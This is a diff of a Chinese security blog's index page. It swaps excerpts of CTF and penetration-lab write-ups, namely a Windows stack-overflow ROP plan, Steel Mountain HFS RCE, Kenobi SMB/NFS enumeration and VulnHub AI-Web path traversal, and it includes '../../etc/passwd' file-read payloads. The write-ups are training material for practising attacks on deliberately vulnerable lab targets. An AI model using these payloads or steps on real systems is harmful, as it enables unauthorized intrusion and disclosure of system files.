-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"buffer:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>dll 版本是 Windows Server 2019</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><ul>
-<li>第一轮<br>第一次必然是要泄露 StackCookie 值，填充到 StackCookie 处通过puts()连带泄露<br>第二次泄露程序基址，因为程序未返回，所以覆盖 StackCookie 也不会crash</li>
-</ul>
-<p>x64PE传参是通过<code>rcx、rdx、r8、r9</code>，exe里的gadget太少无法ROP</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>easyoverflow<span class="token operator">></span> python <span class="token punctuation">..</span><span class="token punctuation">\</span>ROPgadget.py <span class="token parameter variable">--binary</span> <span class="token string">'.\StackOverflow.exe'</span> <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span>
-Gadgets information
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
-0x00000001400017ee <span class="token builtin class-name">:</span> pop rbp <span class="token punctuation">;</span> ret
-0x00000001400010c9 <span class="token builtin class-name">:</span> pop rbx <span class="token punctuation">;</span> ret
-0x00000001400014ed <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret
-0x000000014000133d <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> ret
-0x00000001400014ee <span class="token builtin class-name">:</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret
-0x00000001400010ca <span class="token builtin class-name">:</span> ret
-0x0000000140001818 <span class="token builtin class-name">:</span> ret <span class="token number">0</span>
-0x0000000140001723 <span class="token builtin class-name">:</span> ret 0x8348
-0x0000000140001643 <span class="token builtin class-name">:</span> ret 0xb70f
-0x0000000140001678 <span class="token builtin class-name">:</span> ret 0xeb28
-0x0000000140001d12 <span class="token builtin class-name">:</span> ret <span class="token number">3</span>
-
-Unique gadgets found: <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>第三次返回main()，我们把目标转向 ntdll.dll 来寻找可用的gadget</p>
-	
-	</div>
-  <a type="button" href="/2024/07/09/强网杯2020 easyoverflow/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/08/长城杯铁人三项2020 企业环境渗透/" title="肾透测试">长城杯铁人三项2020 企业环境渗透</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-08  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>创建两个网卡分别为 vmnet2 192.168.50.0，vmnet3 192.168.60.0</p>
-<ul>
-<li>WEB：vmnet2仅主机</li>
-<li>PC：vmnet2仅主机、vmnet3仅主机</li>
-<li>AD：vmnet3仅主机</li>
-</ul>
-<p><img src="/Red_FILE/995d4217d91ce773dd06680bdeb497f2_MD5.jpeg"></p>
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><img src="/Red_FILE/4cdc5b12899f9d6d0600853d9b621f35_MD5.jpeg"></p>
-<p>常规扫端口+扫目录<br><img src="/Red_FILE/2c4acf7c4476397171e33b0fc831e837_MD5.jpeg"></p>
-<p>打开端口：</p>
-<ul>
-<li>22：ssh</li>
-<li>25：smtp</li>
-<li>110：pop3</li>
-<li>80：http</li>
-</ul>
-<p>中间件是apache 2.4.6，centos系统，网站由php5.4.16编写，cms是dedecms</p>
-	
-	</div>
-  <a type="button" href="/2024/07/08/长城杯铁人三项2020 企业环境渗透/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/06/29/Steel Mountain/" >Steel Mountain</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-06-29  </div>
+		<div class="date">post @ 2024-06-21  </div>
 		</div>
 	</div>
 	
@@ -722,49 +459,7 @@ Unique gadgets found: <span class="token number">11</span><span aria-hidden="tru
 	
 	
 		<blockquote>
-<p>侵入以机器人先生为主题的 Windows 机器。使用metasploit进行初始访问，利用powershell进行Windows权限升级枚举，并学习一种新技术来获得管理员访问权限。</p>
-</blockquote>
-<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>最佳员工？确定该员工名字为 Bill Harper<br><img src="/Red_FILE/5ecf1efebac7f0c7020d7cb274cd7d2f_MD5.jpeg"><br>扫下端口，目标机器是Windows Server，开启如下端口：</p>
-<ul>
-<li>80、8080：http</li>
-<li>3389：rdp</li>
-<li>135</li>
-<li>139</li>
-<li>445</li>
-</ul>
-<p>尝试后没有ms17</p>
-<p>80端口首页是个静态页面，而8080是个HttpFileServer<br><img src="/Red_FILE/e546830f2bf6ff321f83bbeafb1eb693_MD5.jpeg"><br>login 登录需要密码</p>
-<p>注意到 HFS 版本为 rejetto 2.3，有历史CVE，可以直接RCE<br><img src="/Red_FILE/8813e2ac62ce698796fea7806608a481_MD5.jpeg"><br>使用msf拿到shell（用searchsploit提供的49584.py也行，但肯定没有meterpreter方便）<br><img src="/Red_FILE/8b6129513f47806d99796bd4acc34636_MD5.jpeg"></p>
-<p>先确定一些基本信息<br><img src="/Red_FILE/6e900810e5ef2f68a42045b3ac04ccb4_MD5.jpeg"><br>该计算机用户是<code>steelmountain\bill</code></p>
-<h1 id="提权（修改服务路径）"><a href="#提权（修改服务路径）" class="headerlink" title="提权（修改服务路径）"></a>提权（修改服务路径）</h1><p>在常规的密码搜集无果后，看看有没有什么可用服务</p>
-	
-	</div>
-  <a type="button" href="/2024/06/29/Steel Mountain/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/06/24/CISCN2024华中赛区选拔赛/" title="赛完就回去考试，重生之我是特种兵">CISCN2024华中赛区选拔赛</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-06-24  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>拿下第8名，不枉此行吧</p>
+<p>入围决赛，不枉此行吧</p>
 </blockquote>
 <p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p>
 <h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAF，tcache 打__free_hook即可</p>
@@ -941,7 +636,7 @@ Unique gadgets found: <span class="token number">11</span><span aria-hidden="tru
 	pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 	
 	</div>
-  <a type="button" href="/2024/06/24/CISCN2024华中赛区选拔赛/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/06/21/CISCN2024华中赛区选拔赛/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -951,11 +646,11 @@ Unique gadgets found: <span class="token number">11</span><span aria-hidden="tru
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/05/11/Kenobi/" >Kenobbi</a>
+			<a href="/2024/06/06/Easy-AI_Web_2/" >Easy-AI_Web_2</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-05-11  </div>
+		<div class="date">post @ 2024-06-06  </div>
 		</div>
 	</div>
 	
@@ -966,203 +661,59 @@ Unique gadgets found: <span class="token number">11</span><span aria-hidden="tru
 	
 	
 		<blockquote>
-<p>有关利用 Linux 机器的演练。枚举 Samba 共享、操纵 proftpd 的易受攻击版本并通过路径变量操纵来升级您的权限。</p>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p>
 </blockquote>
-<h1 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h1><p>nmap先扫一遍，linux机器，开了21、22，80，以及135、445端口的SMB</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">Nmap scan report for 10.10.26.229
-Host is up (0.23s latency).
-Not shown: 993 closed tcp ports (reset)
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         ProFTPD 1.3.5
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
-|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
-|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
-80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: POST OPTIONS GET HEAD
-|_http-title: Site doesn't have a title (text/html).
-| http-robots.txt: 1 disallowed entry 
-|_/admin.html
-111/tcp  open  rpcbind     2-4 (RPC #100000)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-2049/tcp open  nfs         2-4 (RPC #100003)
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.94SVN%E=4%D=5/31%OT=21%CT=1%CU=44711%PV=Y%DS=2%DC=T%G=Y%TM=6659
-OS:D436%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)
-OS:SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10A%TI
-OS:=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M
-OS:508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68D
-OS:F%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%D
-OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
-OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
-OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
-OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
-OS:)IE(R=Y%DFI=N%T=40%CD=S)
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p>
+<p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Uptime guess: 0.076 days (since Fri May 31 19:54:28 2024)
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=259 (Good luck!)
-IP ID Sequence Generation: All zeros
-Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-Host script results:
-| smb2-time: 
-|   date: 2024-05-31T13:44:12
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
-|   Computer name: kenobi
-|   NetBIOS computer name: KENOBI\x00
-|   Domain name: \x00
-|   FQDN: kenobi
-|_  System time: 2024-05-31T08:44:12-05:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
-| nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown>, NetBIOS MAC: &lt;unknown> (unknown)
-| Names:
-|   KENOBI&lt;00>           Flags: &lt;unique>&lt;active>
-|   KENOBI&lt;03>           Flags: &lt;unique>&lt;active>
-|   KENOBI&lt;20>           Flags: &lt;unique>&lt;active>
-|   \x01\x02__MSBROWSE__\x02&lt;01>  Flags: &lt;group>&lt;active>
-|   WORKGROUP&lt;00>        Flags: &lt;group>&lt;active>
-|   WORKGROUP&lt;1d>        Flags: &lt;unique>&lt;active>
-|_  WORKGROUP&lt;1e>        Flags: &lt;group>&lt;active>
-
-TRACEROUTE (using port 1025/tcp)
-HOP RTT       ADDRESS
-1   250.87 ms 10.11.0.1
-2   250.88 ms 10.10.26.229<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>扫目录也并没有发现什么可用的</p>
-<p>该主机名为KENOBI，工作组为WORKGROUP，其SMB共享着一个名为 anonymous 的目录，尝试能否匿名登录：<br><img src="/Red_FILE/c94765f113921783c9fdc765038e6ac5_MD5.jpeg"></p>
-<p>下载下来一个名为log.txt的文件</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">Generating public/private rsa key pair.
-Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
-Created directory '/home/kenobi/.ssh'.
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
-Your identification has been saved in /home/kenobi/.ssh/id_rsa.
-Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
-The key fingerprint is:
-SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
-The key's randomart image is:
-+---[RSA 2048]----+
-|                 |
-|           ..    |
-|        . o. .   |
-|       ..=o +.   |
-|      . So.o++o. |
-|  o ...+oo.Bo*o  |
-| o o ..o.o+.@oo  |
-|  . . . E .O+= . |
-|     . .   oBo.  |
-+----[SHA256]-----+
-
-# This is a basic ProFTPD configuration file (rename it to 
-# 'proftpd.conf' for actual use.  It establishes a single server
-# and a single anonymous login.  It assumes that you have a user/group
-# "nobody" and "ftp" for normal operation and anon.
-
-ServerName			"ProFTPD Default Installation"
-ServerType			standalone
-DefaultServer			on
-
-# Port 21 is the standard FTP port.
-Port				21
-
-# Don't use IPv6 support by default.
-UseIPv6				off
-
-# Umask 022 is a good standard umask to prevent new dirs and files
-# from being group and world writable.
-Umask				022
-
-# To prevent DoS attacks, set the maximum number of child processes
-# to 30.  If you need to allow more than 30 concurrent connections
-# at once, simply increase this value.  Note that this ONLY works
-# in standalone mode, in inetd mode you should use an inetd server
-# that allows you to limit maximum number of processes per service
-# (such as xinetd).
-MaxInstances			30
-
-# Set the user and group under which the server will run.
-User				kenobi
-Group				kenobi
-
-# To cause every FTP user to be "jailed" (chrooted) into their home
-# directory, uncomment this line.
-#DefaultRoot ~
-
-# Normally, we want files to be overwriteable.
-AllowOverwrite		on
-
-# Bar use of SITE CHMOD by default
-&lt;Limit SITE_CHMOD>
-  DenyAll
-&lt;/Limit>
-
-# A basic anonymous configuration, no upload directories.  If you do not
-# want anonymous users, simply delete this entire &lt;Anonymous> section.
-&lt;Anonymous ~ftp>
-  User				ftp
-  Group				ftp
-
-  # We want clients to be able to login with "anonymous" as well as "ftp"
-  UserAlias			anonymous ftp
-
-  # Limit the maximum number of anonymous logins
-  MaxClients			10
-
-  # We want 'welcome.msg' displayed at login, and '.message' displayed
-  # in each newly chdired directory.
-  DisplayLogin			welcome.msg
-  DisplayChdir			.message
-
-  # Limit WRITE everywhere in the anonymous chroot
-  &lt;Limit WRITE>
-    DenyAll
-  &lt;/Limit>
-&lt;/Anonymous>
-#
-# Sample configuration file for the Samba suite for Debian GNU/Linux.
-#
-#
-# This is the main Samba configuration file. You should read the
-# smb.conf(5) manual page in order to understand the options listed
-# here. Samba has a huge number of configurable options most of which 
-# are not shown in this example
-#
-# Some options that are often worth tuning have been included as
-# commented-out examples in this file.
-#  - When such options are commented with ";", the proposed setting
-#    differs from the default Samba behaviour
-#  - When commented with "#", the proposed setting is the default
-#    behaviour of Samba but the option is considered important
-#    enough to be mentioned here
-#
-# NOTE: Whenever you modify this file you should run the command
-# "testparm" to check that you have not made any basic syntactic 
-# errors. 
-
-#======================= Global Settings =======================
-......
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>是关于 ProFTPD 服务的配置文件，可命名为 proftpd.conf 以实际使用<br><img src="/Red_FILE/337ceb5493e57ac85565b2e12e502bb4_MD5.jpeg"></p>
-<p>nfs挂载的目录名为 &#x2F;var，尝试挂载<br><img src="/Red_FILE/644c5c6674519ca8757467af8ae4373b_MD5.jpeg"></p>
+<p>这边扫下目录，正好扫到一个download.php，直接利用</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p>
 	
 	</div>
-  <a type="button" href="/2024/05/11/Kenobi/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/06/06/Easy-AI_Web_2/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/06/05/Easy-AI_Web_1/" >Easy-AI_Web_1</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-06-05  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>额外设置了个跳板机，更接近现实<br><img src="/Rxi134_FILE/fc8a796b7c75ecb02200f2bbf5d32d55_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>扫下端口<br><img src="/Rxi134_FILE/7b75f0a6b36b30a6433a6ef27c967f90_MD5.jpeg"></p>
+<p>访问网站页面，只有一行字<br><img src="/Rxi134_FILE/938b9d2811e2b344493418a36a37ae63_MD5.jpeg"></p>
+<p>dirsearch扫目录只扫出个&#x2F;robots.txt</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">User-agent: *
+Disallow: 
+Disallow: /m3diNf0/
+Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问都是403，拿着 &#x2F;m3diNf0&#x2F; 和 &#x2F;se3reTdir777&#x2F; 继续扫</p>
+<p>扫到  &#x2F;m3diNf0&#x2F;info.php，是一个phpinfo界面<br><img src="/Rxi134_FILE/e895abffb33d61ed10fb573347745eea_MD5.jpeg"><br>这时候想了一下会不会有XXE，但是libxml 2.9.4默认不解析外部实体<br><img src="/Rxi134_FILE/8b7947f4287429e7b16227d7f2fdf36f_MD5.jpeg"></p>
+	
+	</div>
+  <a type="button" href="/2024/06/05/Easy-AI_Web_1/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -1175,16 +726,6 @@ AllowOverwrite		on
 		<div class="pagination">
 
    
-    
-           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
-        
-
-        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
- 
-       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
-        
-
-  
 </div>
 
   		</center>
@@ -1213,13 +754,9 @@ AllowOverwrite		on
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/PWN/">PWN<span>7</span></a></li>
+			<li><a href="/categories/CTFpwn/">CTFpwn<span>2</span></a></li>
 		
-			<li><a href="/categories/RealWorld/">RealWorld<span>2</span></a></li>
-		
-			<li><a href="/categories/赛题/">赛题<span>11</span></a></li>
-		
-			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>11</span></a></li>
+			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>4</span></a></li>
 		
 		</ul>
 	</div>
@@ -1230,15 +767,11 @@ AllowOverwrite		on
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/渗透打靶/">渗透打靶<span>9</span></a></li>
+			<li><a href="/tags/赛题/">赛题<span>2</span></a></li>
 		
-			<li><a href="/tags/IOT/">IOT<span>2</span></a></li>
+			<li><a href="/tags/靶场/">靶场<span>2</span></a></li>
 		
-			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/Linux-Kernel-pwn/">Linux Kernel pwn<span>7</span></a></li>
-		
-			<li><a href="/tags/Windows-pwn/">Windows pwn<span>1</span></a></li>
+			<li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>2</span></a></li>
 		
 		 
 		</ul>
@@ -1252,23 +785,23 @@ AllowOverwrite		on
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2024/09/16/长城杯京津冀2024初赛/" ><i class="fa fa-file-o"></i>长城杯京津冀2024初赛</a>
+        <a href="/2024/10/05/ATT&amp;CK红队评估实战靶场-3/" ><i class="fa fa-file-o"></i>ATT&amp;CK红队评估实战靶场-3</a>
       </li>
     
       <li>
-        <a href="/2024/07/30/Blog/"  title="我就说二进制有用" ><i class="fa fa-file-o"></i>Blog</a>
+        <a href="/2024/09/27/ATT&amp;CK红队评估实战靶场-1/" ><i class="fa fa-file-o"></i>ATT&amp;CK红队评估实战靶场-1</a>
       </li>
     
       <li>
-        <a href="/2024/07/18/HackPark/"  title="踩到猫了" ><i class="fa fa-file-o"></i>HackPark</a>
+        <a href="/2024/09/18/长城杯京津冀2024初赛/" ><i class="fa fa-file-o"></i>长城杯京津冀2024初赛</a>
       </li>
     
       <li>
-        <a href="/2024/07/17/Vulnhub-GOLDENEYE/" ><i class="fa fa-file-o"></i>Vulnhub-GOLDENEYES</a>
+        <a href="/2024/06/21/CISCN2024华中赛区选拔赛/" ><i class="fa fa-file-o"></i>CISCN2024华中赛区选拔赛</a>
       </li>
     
       <li>
-        <a href="/2024/07/10/Alfred/" ><i class="fa fa-file-o"></i>Alfred</a>
+        <a href="/2024/06/06/Easy-AI_Web_2/" ><i class="fa fa-file-o"></i>Easy-AI_Web_2</a>
       </li>
     
   </ul>
